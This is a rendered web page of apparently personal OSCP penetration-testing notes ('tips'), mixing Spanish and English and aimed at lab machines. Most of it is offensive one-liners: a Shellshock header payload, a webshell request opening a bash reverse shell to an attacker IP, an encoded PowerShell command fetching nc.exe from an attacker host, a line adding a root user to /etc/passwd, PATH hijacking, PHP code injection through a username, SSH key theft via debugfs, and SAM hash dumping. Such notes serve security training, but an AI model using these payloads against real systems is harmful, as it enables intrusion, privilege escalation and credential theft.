@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>tips | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="tips" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="stderr y stdout a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex: root@kali:~# curl -H &quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaaa; nc -h 2&gt;&amp;1; echo zzzz;&#39;&quot; http://10.11.1.71/cgi-bin/admin.cgi -s \" />
+<meta property="og:description" content="stderr y stdout a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex: root@kali:~# curl -H &quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaaa; nc -h 2&gt;&amp;1; echo zzzz;&#39;&quot; http://10.11.1.71/cgi-bin/admin.cgi -s \" />
+<link rel="canonical" href="http://localhost:4000/7-varios/tips/" />
+<meta property="og:url" content="http://localhost:4000/7-varios/tips/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/7-varios/tips/","headline":"tips","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"stderr y stdout a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex: root@kali:~# curl -H &quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaaa; nc -h 2&gt;&amp;1; echo zzzz;&#39;&quot; http://10.11.1.71/cgi-bin/admin.cgi -s \\","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item current"><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>varios</h2>
+				<h3>tips</h3>
+			</div>
+			<article class="content">
+				<h1 id="stderr-y-stdout">stderr y stdout</h1>
+<p>a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc  -h 2&gt;&amp;1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \
+</code></pre></div></div>
+
+<h1 id="unzip-with-python">unzip with python</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+import sys
+from zipfile import PyZipFile
+for zip_file in sys.argv[1:]:
+    pzf = PyZipFile(zip_file)
+    pzf.extractall()
+</code></pre></div></div>
+
+<h1 id="urlencode-webshell-request-with-curl">urlencode webshell request with curl</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST http://10.10.10.143/pwned.php --data-urlencode ​ 'exec=bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.4/1234 0&gt;&amp;1"'
+</code></pre></div></div>
+
+<h1 id="run-bash-commands-from-powershell-wut">run bash commands from powershell (wut)</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows&gt; bash -c "command"
+</code></pre></div></div>
+
+<h1 id="ftp">FTP</h1>
+<p>bajar archivos con tipo binario porque los rompe sino</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; type binary
+ftp&gt; get backup.mdb
+</code></pre></div></div>
+
+<h1 id="powershell-hidden-files">powershell hidden files</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir -Force
+</code></pre></div></div>
+<h1 id="data-stream">data stream</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /R
+hm.txt:root.txt:$DATA
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>​powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more &lt; hm.txt:root.txt
+</code></pre></div></div>
+
+<h1 id="rdp">rdp</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -g 85% -r disk:share=/var/www -r clipboard:CLIPBOARD -u username -p password 10.10.10.10
+</code></pre></div></div>
+
+<h1 id="if-can-run-as-sudo-but-dont-have-shell">if can run as sudo but dont have shell</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'toor:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash' &gt;&gt; /etc/passwd
+</code></pre></div></div>
+<p>It will create a new root user with the password “foo”. The encrypted password was generated with: perl -le ‘print crypt(“foo”, “aa”)’. You can then easily elevate to a root shell with su toor.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localgroup Administrators offsec /add
+</code></pre></div></div>
+<p>this only work for old windows in modern execute a reverse shell might be the best idea</p>
+
+<h1 id="clean-carriage-return-from-scripts">clean carriage return from scripts</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sed -i -e ‘s/\r$//’ &lt;script name&gt;
+</code></pre></div></div>
+
+<h1 id="steghide-steganofrafia">steghide steganofrafia</h1>
+<p>usalo para sacar por ejemplo ssh que esten en una imagen</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract -sf archivo.png
+</code></pre></div></div>
+
+<h1 id="pading-oracle-attack">pading oracle attack</h1>
+
+<h1 id="suid">suid</h1>
+<p>si no tiene full path en sudo -l podemos hijackearlo cambiando el path</p>
+
+<p>Because a full path to the cat binary is not specified, this specific command is vulnerable to
+hijacking by modifying the ​ PATH​ system variable. This can be achieved by setting the working
+directory as the first option in PATH, with the command ​ export PATH=.:$PATH
+After this, creating a file named ​ cat​ in the working directory will cause the file to be executed by
+the root user. In this case, a bash script will do the trick. Note, do not use the ​ cat​ command in the
+script as this will cause the script to loop endlessly. Don’t forget to ​ chmod +x ./cat​ before running
+the backup binary. The script below creates a copy of the root flag in the home directory.</p>
+
+<h1 id="ipv6-">IPV6 ?</h1>
+
+<h1 id="unix-wildcards">unix wildcards</h1>
+<p>https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>
+
+<h1 id="windows-php-cookies">windows php cookies</h1>
+<p>PHP stores the session files in C:\Windows\TEMP in the format sess_<cookie> . In order to read
+our session file we will use the session ID we acquired. In this case the session file would be
+sess_923nktm0vmmi12qrptls332t5o . Let's see if we can read it
+Replace everything after sess_ with your own cookie value.</cookie></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET http://10.10.10.151/blog/?
+lang=/windows/temp/sess_923nktm0vmmi12qrptls332t5o
+</code></pre></div></div>
+<p>f we can create a username containing PHP code, we could potentially gain RCE. Consider the
+following as a username.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?=`powershell whoami`?&gt;
+</code></pre></div></div>
+
+<h2 id="bypass-blacklisting-chars">bypass blacklisting chars</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "wget http://10.10.14.23/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t
+UTF-16LE | base64
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?=`powershell /enc
+dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzAC8AbgBjAC4AZQB4AGUA
+IAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUABcAG4AYwAuAGUAeABlAAoA`?&gt;
+</code></pre></div></div>
+
+<h1 id="procdump">procdump</h1>
+
+<h1 id="express-using-jwt-token">express using jwt token</h1>
+<ul>
+  <li>get the token
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s -X POST  http://10.10.10.137:3000/login -d "username=admin&amp;password=pas111223" | jq
+</code></pre></div>    </div>
+  </li>
+  <li>use the token
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s http://10.10.10.137:3000/ -H ​ 'Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNT
+U4ODU1NTYzLCJleHAiOjE1NTg5NDE5NjN9.s7ZbrqwW--H6Ae-UWs3VeO21U2XRwfNEDeL0gAYI
+pX0'​ | jq
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="inodes">INODES</h1>
+<p>if you own the directory but not the file, you can move it and create another one with the same name</p>
+
+<h1 id="disk-permision">disk permision</h1>
+<p>if you have disk permission you can use</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugfs /dev/sda1
+debugfs: cat /root/.ssh/id_rsa
+</code></pre></div></div>
+<h1 id="powershell-thruogh-ftp-when-restricted">powershell thruogh ftp when restricted</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> echo !powershell.exe &gt; ftpcommands.txt &amp;&amp; ftp -s:ftpcommands.txt
+</code></pre></div></div>
+<h1 id="weird-dependencies-location">weird dependencies location</h1>
+<p>for example :
+As gcc is not available on the target machine, the exploit must be compiled locally. LinEnum
+previously identified ​ /home/decoder/test​ as world-writable and can be used to drop the binary.
+Attempting to run the exploit without modification will fail as the target is missing ​ /etc/lsb-release​ .
+Simply changing references of ​ /etc/lsb-release​ to ​ /home/decoder/test/lsb-release​ is sufficient.</p>
+
+<h1 id="dump-hashes">DUMP HASHES</h1>
+<p>reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+python /usr/share/doc/python-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</p>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
